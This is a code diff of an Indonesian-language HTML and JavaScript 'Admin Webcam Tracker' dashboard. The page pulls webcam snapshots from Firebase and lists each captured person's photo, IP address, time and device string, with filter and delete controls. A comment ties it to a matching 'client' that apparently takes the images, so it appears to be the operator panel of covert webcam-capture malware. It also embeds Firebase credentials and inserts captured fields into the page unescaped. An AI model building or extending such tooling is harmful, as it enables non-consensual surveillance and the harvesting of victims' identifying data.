@@ -32,7 +32,7 @@
       border: 1px solid #0f0;
       margin-top: 10px;
     }
-    select {
+    select, button {
       background: black;
       color: lime;
       padding: 8px 15px;
@@ -61,12 +61,20 @@
       font-weight: bold;
       color: #ff0;
     }
+    .actions {
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #0f0;
+      color: black;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
   <div class="header">
     <h1>Admin Webcam Tracker</h1>
-    <p>Data dari Catbox.moe + Firebase</p>
+    <p>Data dari Firebase Realtime Database</p>
   </div>
 
   <div class="filter-section">
@@ -74,17 +82,19 @@
     <select id="ipFilter">
       <option value="all">Semua IP</option>
     </select>
+    <button id="refreshBtn">Refresh Data</button>
+    <button id="deleteAllBtn">Hapus Semua</button>
   </div>
 
   <div class="stats">
-    Total: <span id="totalCount" class="count">0</span> | 
+    Total Data: <span id="totalCount" class="count">0</span> | 
     Tampil: <span id="displayCount" class="count">0</span>
   </div>
 
   <div id="output"></div>
 
   <script>
-    // 🔥 Konfigurasi Firebase
+    // 🔥 Firebase Config (Sesuaikan dengan project Anda)
     const firebaseConfig = {
       apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
       authDomain: "xr-social-53646.firebaseapp.com",
@@ -94,17 +104,25 @@
       messagingSenderId: "55685443011",
       appId: "1:55685443011:web:ef0f9de8e329d24d512176"
     };
+
+    // 🚀 Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+
+    // 🎯 Path khusus untuk webcam data (harus sama dengan client)
+    const WEBHOOK_PATH = "webcam_snapshots_v2";
 
     // 🎯 Elemen DOM
     const output = document.getElementById("output");
     const ipFilter = document.getElementById("ipFilter");
+    const refreshBtn = document.getElementById("refreshBtn");
+    const deleteAllBtn = document.getElementById("deleteAllBtn");
     const totalCountEl = document.getElementById("totalCount");
     const displayCountEl = document.getElementById("displayCount");
+    
     let allData = [];
 
-    // 🖼️ Render data
+    // 📜 Render data ke HTML
     function renderData() {
       output.innerHTML = "";
       const selectedIP = ipFilter.value;
@@ -118,42 +136,64 @@
         const div = document.createElement("div");
         div.className = "entry";
         div.innerHTML = `
-          <div><b>IP:</b> ${d.ip}</div>
-          <div><b>Waktu:</b> ${d.time}</div>
-          <div><b>Device:</b> <small>${d.userAgent}</small></div>
+          <div><b>IP:</b> ${d.ip || 'unknown'}</div>
+          <div><b>Waktu:</b> ${d.time || 'N/A'}</div>
+          <div><b>Device:</b> <small>${d.userAgent || 'unknown'}</small></div>
+          <div class="actions">
+            <button onclick="deleteEntry('${d.key}')">Hapus</button>
+          </div>
           <img src="${d.url}" onerror="this.style.display='none'">
         `;
         output.appendChild(div);
       });
     }
 
-    // 📡 Load data dari Firebase
-    db.ref("webcam_snapshots").on("value", snapshot => {
-      allData = [];
-      const ipSet = new Set();
+    // 🗑️ Hapus entry spesifik
+    window.deleteEntry = async function(key) {
+      if(confirm("Hapus data ini?")) {
+        await db.ref(`${WEBHOOK_PATH}/${key}`).remove();
+      }
+    };
 
-      snapshot.forEach(childSnapshot => {
-        const item = childSnapshot.val();
-        allData.push(item);
-        ipSet.add(item.ip);
-      });
+    // 🔄 Refresh data
+    refreshBtn.addEventListener("click", loadData);
+
+    // 🗑️ Hapus semua data
+    deleteAllBtn.addEventListener("click", async () => {
+      if(confirm("Yakin hapus SEMUA data?")) {
+        await db.ref(WEBHOOK_PATH).remove();
+        allData = [];
+        renderData();
+      }
+    });
+
+    // 📥 Load data dari Firebase
+    async function loadData() {
+      const snapshot = await db.ref(WEBHOOK_PATH).once("value");
+      const data = snapshot.val() || {};
+      
+      allData = Object.entries(data).map(([key, value]) => ({
+        key,
+        ...value
+      }));
 
       totalCountEl.textContent = allData.length;
 
-      // Update dropdown IP
-      const currentIP = ipFilter.value;
+      // Update IP filter dropdown
+      const uniqueIPs = [...new Set(allData.map(d => d.ip))].filter(Boolean).sort();
       ipFilter.innerHTML = '<option value="all">Semua IP</option>';
-      Array.from(ipSet).sort().forEach(ip => {
+      uniqueIPs.forEach(ip => {
         const option = document.createElement("option");
         option.value = ip;
         option.textContent = ip;
-        if(ip === currentIP) option.selected = true;
         ipFilter.appendChild(option);
       });
 
       renderData();
-    });
+    }
 
+    // 🎬 Inisialisasi
+    loadData();
     ipFilter.addEventListener("change", renderData);
   </script>
 </body>
